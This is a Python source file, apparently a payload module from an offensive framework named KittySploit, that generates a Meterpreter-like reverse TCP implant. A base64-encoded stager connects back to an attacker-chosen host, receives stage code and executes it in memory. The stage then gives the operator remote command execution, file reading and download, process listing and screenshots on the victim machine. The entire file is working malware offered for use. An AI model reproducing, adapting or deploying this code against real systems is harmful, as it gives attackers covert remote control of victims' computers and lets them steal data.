#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Python Meterpreter Reverse TCP Payload
Author: KittySploit Team
Version: 1.0.0

This payload creates a Meterpreter-like client that connects back to the listener
and provides advanced post-exploitation capabilities.

REQUIREMENT: Python must be installed on the target system
"""

from kittysploit import *
import json
import base64
import struct

class Module(Payload):
    __info__ = {
        'name': 'Python Meterpreter, Reverse TCP',
        'description': 'Meterpreter-like payload that connects back via TCP (requires Python on target)',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'category': 'singles',
        'arch': Arch.PYTHON,
        'listener': 'listeners/multi/meterpreter',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': []
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    python_binary = OptString("python3", "Python binary version", True)
    encoder = OptString("", "Encoder", False, True)
    
    def generate(self):
        """Generate the Meterpreter stager payload code"""
        
        stager_code = f'''
import socket
import struct
import base64

def connect_and_load():
    host = '{self.lhost}'
    port = {self.lport}
    
    try:
        # Connect to listener
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        sock.settimeout(None)  # Blocking mode after connection
        
        # Receive stage code length (4 bytes big-endian)
        length_data = b''
        while len(length_data) < 4:
            chunk = sock.recv(4 - len(length_data))
            if not chunk:
                return
            length_data += chunk
        
        stage_length = struct.unpack('>I', length_data)[0]
        
        # Receive stage code
        stage_data = b''
        while len(stage_data) < stage_length:
            chunk = sock.recv(min(4096, stage_length - len(stage_data)))
            if not chunk:
                return
            stage_data += chunk
        
        # Decode and execute stage code in memory
        stage_code = base64.b64decode(stage_data).decode('utf-8')
        
        # Execute the stage code (Meterpreter client)
        # Pass the socket to the stage so it can continue using it
        exec(compile(stage_code, '<stage>', 'exec'), {{'sock': sock, 'socket': socket, 'struct': struct, 'json': __import__('json'), 'subprocess': __import__('subprocess'), 'os': __import__('os'), 'sys': __import__('sys'), 'base64': base64, 'platform': __import__('platform'), 'time': __import__('time'), 'shlex': __import__('shlex')}})
        
    except Exception as e:
        import sys
        sys.stderr.write(f"Stager error: {{str(e)}}\\n")
        if 'sock' in locals():
            sock.close()

if __name__ == '__main__':
    connect_and_load()
'''
        
        # Full Meterpreter client code (stage) that will be sent by the listener
        meterpreter_code = '''
import socket
import subprocess
import os
import sys
import json
import base64
import struct
import platform
import time
import shlex

class MeterpreterClient:
    TIMEOUT_MARKER = object()
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.current_dir = os.getcwd()
        self.is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
        self.username = os.getenv('USER', 'user')
        self.hostname = platform.node()
        
    def connect(self):
        """Connect to the Meterpreter listener"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Use timeout only during connection phase
            self.sock.settimeout(10)
            self.sock.connect((self.host, self.port))
            # Use a longer timeout for recv() to allow commands to arrive
            # The timeout allows periodic checks while still waiting for commands
            self.sock.settimeout(5.0)  # Increased from 1.0 to 5.0 seconds
            return True
        except Exception as e:
            return False
    
    def _fix_encoding(self, text):
        """Fix encoding issues, especially Windows-1252/CP850 to UTF-8"""
        if not text or not isinstance(text, str):
            return text if text else ""
        
        try:
            # If text contains characters that suggest encoding issues
            # Try to fix common Windows encoding problems
            if 'Ã' in text:
                # Likely UTF-8 decoded as Latin-1, try to fix
                try:
                    text = text.encode('latin1', errors='ignore').decode('utf-8', errors='replace')
                except:
                    pass
            
            # Ensure the text is properly encoded as UTF-8
            # If it's already a valid UTF-8 string, this won't change it
            try:
                text.encode('utf-8')
            except UnicodeEncodeError:
                # If encoding fails, try to fix it
                try:
                    # Try Windows-1252
                    text = text.encode('latin1', errors='ignore').decode('windows-1252', errors='replace')
                except:
                    try:
                        # Try CP850
                        text = text.encode('latin1', errors='ignore').decode('cp850', errors='replace')
                    except:
                        # Use replace for invalid characters
                        text = text.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
        except:
            pass
        
        return text
    
    def send_response(self, data, status=0, error=""):
        """Send response to listener"""
        try:
            # Check if socket is still valid
            if not self.sock:
                return False
            
            # Ensure data is a string and fix encoding
            if data is None:
                data = ""
            if not isinstance(data, str):
                data = str(data)
            
            # Fix encoding issues before sending
            data = self._fix_encoding(data)
            if error:
                error = self._fix_encoding(error)
            
            response = {
                'output': data,
                'status': status,
                'error': error
            }
            response_json = json.dumps(response, ensure_ascii=False)
            response_bytes = response_json.encode('utf-8')
            # Send length first, then data
            length = struct.pack('>I', len(response_bytes))
            self.sock.sendall(length + response_bytes)
            import sys
            resp_len = len(response_bytes)
            status_str = str(status)
            sys.stderr.write("[DEBUG] send_response: sent " + str(resp_len) + " bytes, status=" + status_str + "\\n")
            return True
        except (socket.error, OSError) as e:
            # Socket error - connection may be closed
            import sys
            error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
            error_msg = str(e)
            sys.stderr.write("[DEBUG] send_response socket error (code=" + str(error_code) + "): " + error_msg + "\\n")
            # Don't close socket here, let run() handle it
            return False
        except Exception as e:
            import sys
            import traceback
            error_msg = str(e)
            sys.stderr.write("[DEBUG] send_response ERROR: " + error_msg + "\\n")
            traceback.print_exc(file=sys.stderr)
            return False
    
    def receive_command(self):
        """Receive command from listener"""
        try:
            # Receive length (4 bytes)
            length_data = b''
            while len(length_data) < 4:
                chunk = self.sock.recv(4 - len(length_data))
                if not chunk:
                    return None
                length_data += chunk
            
            length = struct.unpack('>I', length_data)[0]
            
            # Validate length to prevent buffer overflow
            if length > 10 * 1024 * 1024:  # 10MB max
                return None
            
            # Receive command data
            command_data = b''
            while len(command_data) < length:
                chunk = self.sock.recv(min(4096, length - len(command_data)))
                if not chunk:
                    return None
                command_data += chunk
            
            command_json = command_data.decode('utf-8')
            command = json.loads(command_json)
            import sys
            cmd_name = command.get('command', 'N/A') if command else 'N/A'
            cmd_args = command.get('args', []) if command else []
            args_str = str(cmd_args)
            sys.stderr.write("[DEBUG] receive_command: received command=" + str(cmd_name) + ", args=" + args_str + "\\n")
            return command
        except socket.timeout:
            # Timeout is not a fatal error - just idle waiting
            return self.TIMEOUT_MARKER
        except socket.error as e:
            # Socket errors are fatal
            import sys
            error_msg = str(e)
            sys.stderr.write("[DEBUG] receive_command socket.error: " + error_msg + "\\n")
            return None
        except Exception as e:
            # Other exceptions are fatal
            import sys
            import traceback
            error_msg = str(e)
            sys.stderr.write("[DEBUG] receive_command ERROR: " + error_msg + "\\n")
            traceback.print_exc(file=sys.stderr)
            return None
    
    def execute_command(self, cmd, args):
        """Execute a Meterpreter command"""
        try:
            import sys
            args_str = str(args)
            sys.stderr.write("[DEBUG] execute_command: cmd='" + str(cmd) + "', args=" + args_str + "\\n")
            # Core commands
            if cmd == 'help' or cmd == '?':
                help_text = """Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    cd            Change directory
    exit          Terminate the Meterpreter session
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    help          Help menu
    ls            List files
    pwd           Print working directory
    sysinfo       Gets information about the remote system, such as OS
    execute       Execute a command
    cat           Read the contents of a file
    ps            List running processes
    whoami        Get current user identity
    id            Get user and group IDs
    download      Download a file from target
    upload        Upload a file to target (basic)
    screenshot    Capture screenshot (base64 encoded)
    migrate       Migrate to another process (validation only)
    shell         Enter interactive shell or execute shell command

"""
                return help_text, 0, ""
            
            elif cmd == 'sysinfo':
                import sys
                uname = platform.uname()
                output = f"Computer\\t\\t: {uname.node}\\n"
                output += f"OS\\t\\t\\t: {uname.system} {uname.release} {uname.version}\\n"
                output += f"Architecture\\t\\t: {uname.machine}\\n"
                output += f"System Language\\t\\t: {os.getenv('LANG', 'en_US.UTF-8')}\\n"
                output += f"Meterpreter\\t\\t: Python\\n"
                output += f"Python Version\\t\\t: {sys.version.split()[0]}\\n"
                output_len = len(output)
                sys.stderr.write("[DEBUG] sysinfo: returning " + str(output_len) + " bytes\\n")
                return output, 0, ""
            
            elif cmd == 'getuid':
                uid = 0 if self.is_root else os.getuid() if hasattr(os, 'getuid') else 1000
                return f"Server username: {self.username} ({uid})\\n", 0, ""
            
            elif cmd == 'getpid':
                return f"Current pid: {os.getpid()}\\n", 0, ""
            
            elif cmd == 'pwd':
                return self.current_dir + "\\n", 0, ""
            
            elif cmd == 'cd':
                if not args:
                    target = os.getenv('HOME', '/home/user')
                else:
                    target = args[0]
                
                if not os.path.isabs(target):
                    target = os.path.join(self.current_dir, target)
                
                target = os.path.normpath(target)
                if os.path.exists(target) and os.path.isdir(target):
                    self.current_dir = target
                    return "", 0, ""
                else:
                    return "", 1, f"cd: {target}: No such file or directory"
            
            elif cmd == 'ls':
                target = self.current_dir if not args else args[0]
                if not os.path.isabs(target):
                    target = os.path.join(self.current_dir, target)
                
                if not os.path.exists(target):
                    return "", 1, f"ls: {target}: No such file or directory"
                
                if not os.path.isdir(target):
                    return target + "\\n", 0, ""
                
                items = sorted(os.listdir(target))
                output_lines = []
                for item in items:
                    item_path = os.path.join(target, item)
                    if os.path.isdir(item_path):
                        output_lines.append(f"{item}/")
                    elif os.path.isfile(item_path):
                        size = os.path.getsize(item_path)
                        output_lines.append(f"{item} ({size} bytes)")
                    else:
                        output_lines.append(f"{item}*")
                
                return "\\n".join(output_lines) + "\\n", 0, ""
            
            elif cmd == 'cat':
                if not args:
                    return "", 1, "Usage: cat <file>"
                
                file_path = args[0]
                if not os.path.isabs(file_path):
                    file_path = os.path.join(self.current_dir, file_path)
                
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            return f.read(), 0, ""
                    else:
                        return "", 1, f"cat: {file_path}: No such file"
                except Exception as e:
                    return "", 1, f"cat error: {str(e)}"
            
            elif cmd == 'execute':
                if not args:
                    return "", 1, "Usage: execute <command>"
                
                command = ' '.join(args)
                try:
                    # Use encoding parameter to handle Windows properly
                    encoding = 'utf-8'
                    errors = 'replace'
                    if platform.system() == 'Windows':
                        # Windows cmd.exe often uses cp850 or windows-1252
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                    
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        encoding=encoding,
                        errors=errors,
                        cwd=self.current_dir,
                        timeout=30
                    )
                    # Fix encoding in output
                    stdout = self._fix_encoding(result.stdout) if result.stdout else ""
                    stderr = self._fix_encoding(result.stderr) if result.stderr else ""
                    return stdout, result.returncode, stderr
                except Exception as e:
                    return "", 1, f"execute error: {{str(e)}}"
            
            elif cmd == 'ps':
                try:
                    encoding = 'utf-8'
                    errors = 'replace'
                    if platform.system() == 'Windows':
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                        result = subprocess.run(['tasklist'], capture_output=True, text=True, encoding=encoding, errors=errors, timeout=5)
                    else:
                        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, encoding=encoding, errors=errors, timeout=5)
                    stdout = self._fix_encoding(result.stdout) if result.stdout else ""
                    stderr = self._fix_encoding(result.stderr) if result.stderr else ""
                    return stdout, 0, stderr
                except Exception as e:
                    return "", 1, f"ps error: {str(e)}"
            
            elif cmd == 'whoami':
                # Get current user identity
                try:
                    if platform.system() == 'Windows':
                        encoding = 'utf-8'
                        errors = 'replace'
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                        result = subprocess.run(['whoami'], capture_output=True, text=True, encoding=encoding, errors=errors, timeout=5)
                        output = self._fix_encoding(result.stdout.strip()) if result.stdout else ""
                        return output + "\\n", 0, ""
                    else:
                        import pwd
                        uid = os.getuid()
                        user_info = pwd.getpwuid(uid)
                        return user_info.pw_name + "\\n", 0, ""
                except Exception as e:
                    return "", 1, f"whoami error: {str(e)}"
            
            elif cmd == 'id':
                # Get user and group IDs (Unix-like systems)
                try:
                    if platform.system() == 'Windows':
                        return "id command not available on Windows\\n", 1, ""
                    else:
                        import pwd
                        import grp
                        uid = os.getuid()
                        gid = os.getgid()
                        user_info = pwd.getpwuid(uid)
                        group_info = grp.getgrgid(gid)
                        
                        # Get supplementary groups
                        groups = []
                        for g in os.getgroups():
                            try:
                                grp_info = grp.getgrgid(g)
                                groups.append(grp_info.gr_name)
                            except:
                                groups.append(str(g))
                        
                        groups_str = ','.join([str(g) + '(' + grp.getgrgid(g).gr_name + ')' for g in os.getgroups()])
                        output = f"uid={uid}({user_info.pw_name}) gid={gid}({group_info.gr_name}) groups={groups_str}\\n"
                        return output, 0, ""
                except Exception as e:
                    return "", 1, f"id error: {str(e)}"
            
            elif cmd == 'download':
                # Download a file from target to attacker (read file and return content)
                if not args:
                    return "", 1, "Usage: download <remote_file>"
                
                file_path = args[0]
                if not os.path.isabs(file_path):
                    file_path = os.path.join(self.current_dir, file_path)
                
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                            # Encode as base64 for safe transmission
                            import base64
                            encoded_data = base64.b64encode(file_data).decode('utf-8')
                            return encoded_data, 0, ""
                    else:
                        return "", 1, f"download: {file_path}: No such file"
                except Exception as e:
                    return "", 1, f"download error: {str(e)}"
            
            elif cmd == 'upload':
                # Upload a file to target (save base64 encoded data)
                if len(args) < 2:
                    return "", 1, "Usage: upload <local_file_path> <remote_file_path>"
                
                # Note: This is a simplified version - in real implementation, 
                # you'd need to handle file transfer differently
                return "", 1, "Upload command not fully implemented - use execute to write files"
            
            elif cmd == 'screenshot':
                # Capture screenshot using native methods (no external dependencies)
                try:
                    if platform.system() == 'Windows':
                        # Windows screenshot using Win32 API via ctypes (native, no dependencies)
                        try:
                            import ctypes
                            from ctypes import wintypes
                            import io
                            import base64
                            
                            # Get screen dimensions
                            user32 = ctypes.windll.user32
                            width = user32.GetSystemMetrics(0)
                            height = user32.GetSystemMetrics(1)
                            
                            # Create device context
                            hdc = user32.GetDC(0)
                            
                            # Create bitmap
                            gdi32 = ctypes.windll.gdi32
                            memdc = gdi32.CreateCompatibleDC(hdc)
                            bmp = gdi32.CreateCompatibleBitmap(hdc, width, height)
                            gdi32.SelectObject(memdc, bmp)
                            
                            # Copy screen to bitmap
                            gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
                            
                            # Convert bitmap to PNG using Windows API
                            # We'll use a simple BMP format instead (native Windows format)
                            # Calculate BMP size
                            bmp_size = 54 + (width * height * 4)  # 54 byte header + RGBA data
                            
                            # Create BMP header
                            bmp_data = bytearray(bmp_size)
                            # BMP file header (14 bytes)
                            bmp_data[0:2] = b'BM'  # Signature
                            bmp_data[2:6] = bmp_size.to_bytes(4, 'little')  # File size
                            bmp_data[6:10] = b'\\x00\\x00\\x00\\x00'  # Reserved
                            bmp_data[10:14] = (54).to_bytes(4, 'little')  # Offset to pixel data
                            
                            # DIB header (40 bytes)
                            bmp_data[14:18] = (40).to_bytes(4, 'little')  # DIB header size
                            bmp_data[18:22] = width.to_bytes(4, 'little', signed=True)  # Width
                            bmp_data[22:26] = (-height).to_bytes(4, 'little', signed=True)  # Height (negative = top-down)
                            bmp_data[26:28] = (1).to_bytes(2, 'little')  # Planes
                            bmp_data[28:30] = (32).to_bytes(2, 'little')  # Bits per pixel
                            bmp_data[30:34] = (0).to_bytes(4, 'little')  # Compression (BI_RGB)
                            bmp_data[34:38] = ((width * height * 4)).to_bytes(4, 'little')  # Image size
                            bmp_data[38:42] = (0).to_bytes(4, 'little')  # X pixels per meter
                            bmp_data[42:46] = (0).to_bytes(4, 'little')  # Y pixels per meter
                            bmp_data[46:50] = (0).to_bytes(4, 'little')  # Colors used
                            bmp_data[50:54] = (0).to_bytes(4, 'little')  # Important colors
                            
                            # Get pixel data (simplified - would need GetDIBits for full implementation)
                            # For now, we'll use a workaround: save as BMP file then read it
                            import tempfile
                            with tempfile.NamedTemporaryFile(suffix='.bmp', delete=False) as tmp:
                                tmp_path = tmp.name
                            
                            try:
                                # Use Windows API to save bitmap
                                # Alternative: use PowerShell to capture screenshot
                                ps_cmd = f'Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $bmp.Save(\\\"{tmp_path}\\\", [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose()'
                                result = subprocess.run(['powershell', '-Command', ps_cmd], 
                                                      capture_output=True, text=True, timeout=10)
                                
                                if result.returncode == 0 and os.path.exists(tmp_path):
                                    with open(tmp_path, 'rb') as f:
                                        img_data = f.read()
                                    os.unlink(tmp_path)
                                    encoded = base64.b64encode(img_data).decode('utf-8')
                                    return encoded, 0, ""
                                else:
                                    # Fallback: use mspaint or other native tool
                                    raise Exception("PowerShell method failed")
                            except:
                                # Final fallback: try using native Windows tools
                                # Use nircmd if available, or try other methods
                                if os.path.exists(tmp_path):
                                    os.unlink(tmp_path)
                                
                                # Try using Windows built-in screenshot capability via SnippingTool automation
                                # Or use a simple method: execute PrintScreen and save to clipboard, then read
                                # For simplicity, we'll return an error suggesting alternative
                                return "", 1, "Screenshot requires PowerShell. Alternative: use 'execute PrintScreen' and save manually"
                            
                            # Cleanup
                            gdi32.DeleteObject(bmp)
                            gdi32.DeleteDC(memdc)
                            user32.ReleaseDC(0, hdc)
                            
                        except Exception as e:
                            return "", 1, f"Windows screenshot error: {str(e)}"
                    else:
                        # Linux screenshot using various native methods
                        try:
                            import tempfile
                            import base64
                            
                            # Try multiple screenshot tools in order of preference
                            tools = [
                                ('xwd', ['-root', '-out'], '.xwd'),
                                ('import', ['-window', 'root'], '.png'),  # ImageMagick
                                ('scrot', ['-'], '.png'),  # scrot (screenshot tool)
                                ('gnome-screenshot', ['-f'], '.png'),  # GNOME
                                ('xfce4-screenshooter', ['-f'], '.png'),  # XFCE
                                ('maim', ['-x'], '.png'),  # maim (screenshot tool)
                            ]
                            
                            for tool_name, tool_args, ext in tools:
                                result = subprocess.run(['which', tool_name], 
                                                      capture_output=True, text=True, timeout=2)
                                if result.returncode == 0:
                                    # Tool found, try to use it
                                    with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as tmp:
                                        tmp_path = tmp.name
                                    
                                    try:
                                        if tool_name == 'scrot':
                                            # scrot outputs to stdout, need different handling
                                            result = subprocess.run([tool_name] + tool_args, 
                                                                  capture_output=True, timeout=5)
                                            if result.returncode == 0:
                                                img_data = result.stdout
                                            else:
                                                raise Exception(f"{tool_name} failed")
                                        else:
                                            # Most tools write to file
                                            if tool_name in ['gnome-screenshot', 'xfce4-screenshooter']:
                                                # These tools need file path as last argument
                                                cmd = [tool_name] + tool_args + [tmp_path]
                                            else:
                                                # xwd, import, maim append output file
                                                cmd = [tool_name] + tool_args + [tmp_path]
                                            
                                            subprocess.run(cmd, timeout=5, check=True)
                                            
                                            if os.path.exists(tmp_path):
                                                with open(tmp_path, 'rb') as f:
                                                    img_data = f.read()
                                            else:
                                                raise Exception(f"{tool_name} did not create output file")
                                        
                                        # Clean up temp file
                                        if os.path.exists(tmp_path):
                                            os.unlink(tmp_path)
                                        
                                        # Encode and return
                                        encoded = base64.b64encode(img_data).decode('utf-8')
                                        return encoded, 0, ""
                                        
                                    except Exception as tool_error:
                                        # Tool failed, try next one
                                        if os.path.exists(tmp_path):
                                            try:
                                                os.unlink(tmp_path)
                                            except:
                                                pass
                                        continue
                            
                            # No tool found
                            return "", 1, "No screenshot tool available. Install one of: xwd, imagemagick, scrot, gnome-screenshot, xfce4-screenshooter, or maim"
                            
                        except Exception as e:
                            return "", 1, f"Linux screenshot error: {str(e)}"
                except Exception as e:
                    return "", 1, f"screenshot error: {str(e)}"
            
            elif cmd == 'migrate':
                # Migrate to another process
                if not args:
                    return "", 1, "Usage: migrate <pid>"
                
                try:
                    target_pid = int(args[0])
                    current_pid = os.getpid()
                    
                    if target_pid == current_pid:
                        return "", 1, f"Already running in process {target_pid}"
                    
                    # Check if target process exists
                    if platform.system() == 'Windows':
                        result = subprocess.run(['tasklist', '/FI', f'PID eq {target_pid}'], 
                                              capture_output=True, text=True, timeout=5)
                        if str(target_pid) not in result.stdout:
                            return "", 1, f"Process {target_pid} not found"
                    else:
                        try:
                            os.kill(target_pid, 0)  # Check if process exists
                        except OSError:
                            return "", 1, f"Process {target_pid} not found"
                    
                    # Note: Full process migration requires injecting code into the target process
                    # This is a simplified version that just validates the target
                    # In a real implementation, you'd need to:
                    # 1. Allocate memory in target process
                    # 2. Write payload code to target process
                    # 3. Create remote thread to execute payload
                    # 4. Update socket connection to new process
                    
                    return f"Migration to PID {target_pid} validated. Full migration requires process injection (not implemented in Python payload).\\n", 0, ""
                except ValueError:
                    return "", 1, f"Invalid PID: {args[0]}"
                except Exception as e:
                    return "", 1, f"migrate error: {str(e)}"
            
            elif cmd == 'shell':
                # Execute command in shell
                if not args:
                    # No command provided - return shell info
                    shell_cmd = '/bin/bash' if platform.system() != 'Windows' else 'cmd.exe'
                    return f"Shell: {shell_cmd}\\nType commands to execute them in the shell.\\n", 0, ""
                
                # Execute command in shell
                command = ' '.join(args)
                try:
                    if platform.system() == 'Windows':
                        # On Windows, use cmd.exe /c to execute the command
                        # Handle PowerShell specially to avoid interactive blocking
                        if command.lower().startswith('powershell'):
                            # If it's just "powershell", show help
                            if command.lower().strip() == 'powershell':
                                return "PowerShell requires a command. Use: powershell <command>\\nExample: powershell Get-Process\\n", 0, ""
                            # If it already has -Command, use as is, otherwise add it
                            if '-Command' not in command and '-c' not in command:
                                # Extract the PowerShell command part
                                ps_cmd = command.replace('powershell', '', 1).strip()
                                if ps_cmd:
                                    command = f'powershell -Command "{ps_cmd}"'
                                else:
                                    return "PowerShell requires a command. Use: powershell <command>\\n", 0, ""
                        
                        encoding = 'utf-8'
                        errors = 'replace'
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                        result = subprocess.run(
                            ['cmd.exe', '/c', command],
                            shell=False,
                            capture_output=True,
                            text=True,
                            encoding=encoding,
                            errors=errors,
                            cwd=self.current_dir,
                            timeout=30
                        )
                    else:
                        # On Unix-like systems, use shell=True with bash
                        result = subprocess.run(
                            command,
                            shell=True,
                            executable='/bin/bash',
                            capture_output=True,
                            text=True,
                            encoding='utf-8',
                            errors='replace',
                            cwd=self.current_dir,
                            timeout=30
                        )
                    output = self._fix_encoding(result.stdout) if result.stdout else ""
                    if result.stderr:
                        output += self._fix_encoding(result.stderr)
                    return output, result.returncode, ""
                except subprocess.TimeoutExpired:
                    return "", 1, "Command timed out (interactive commands may block)"
                except Exception as e:
                    return "", 1, f"shell error: {str(e)}"
            
            # Default: execute as system command
            else:
                # Execute unknown command as system command
                command = cmd + (' ' + ' '.join(args) if args else '')
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        cwd=self.current_dir,
                        timeout=30
                    )
                    return result.stdout, result.returncode, result.stderr
                except Exception as e:
                    return "", 1, f"Command error: {str(e)}"
        
        except Exception as e:
            import sys
            import traceback
            error_msg = str(e)
            sys.stderr.write("[DEBUG] execute_command ERROR: " + error_msg + "\\n")
            traceback.print_exc(file=sys.stderr)
            return "", 1, f"Execution error: {str(e)}"
    
    def run(self):
        """Main loop"""
        # If socket is already provided (from stager), use it
        if self.sock is None:
            if not self.connect():
                return False
        
        try:
            while True:
                command = self.receive_command()
                
                # Timeout is not a fatal error - keep waiting
                if command is self.TIMEOUT_MARKER:
                    continue
                
                # None means connection closed or fatal error
                if not command:
                    break
                
                cmd = command.get('command', '')
                args = command.get('args', [])
                
                if cmd.lower() == 'exit':
                    break
                
                output, status, error = self.execute_command(cmd, args)
                import sys
                output_len = len(output) if output else 0
                status_str = str(status)
                sys.stderr.write("[DEBUG] run: command executed, output_len=" + str(output_len) + ", status=" + status_str + "\\n")
                if not self.send_response(output, status, error):
                    sys.stderr.write("[DEBUG] run: send_response returned False\\n")
        
        except Exception as e:
            # Log exceptions for debugging
            import sys
            import traceback
            error_msg = str(e)
            sys.stderr.write("[DEBUG] run() ERROR: " + error_msg + "\\n")
            traceback.print_exc(file=sys.stderr)
        finally:
            if self.sock:
                self.sock.close()
        
        return True

# Stage entry point - socket is passed from stager
if 'sock' in globals():
    # We're running as stage, socket already connected
    client = MeterpreterClient(None, None)
    client.sock = sock
    # Set timeout for receive operations
    client.sock.settimeout(5.0)
    client.run()

# Direct execution (for testing)
if __name__ == '__main__':
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    client = MeterpreterClient(host, port)
    client.run()
'''
        
        # Store the full Meterpreter stage code for the listener to send
        self.meterpreter_stage_code = meterpreter_code
        
        # Return the command to execute the stager (small payload)
        # Encode the stager code to avoid issues with quotes
        encoded_stager = base64.b64encode(stager_code.encode('utf-8')).decode('utf-8')
        
        # Generate the command (no arguments needed, lhost and lport are in the code)
        command = f'''{self.python_binary} -c "import base64; exec(base64.b64decode('{encoded_stager}').decode('utf-8'))"'''
        
        return command
    
    def get_stage_code(self):
        """Get the full Meterpreter stage code to send to the stager"""
        if hasattr(self, 'meterpreter_stage_code'):
            return self.meterpreter_stage_code
        # Fallback: generate it if not already generated
        self.generate()
        return self.meterpreter_stage_code

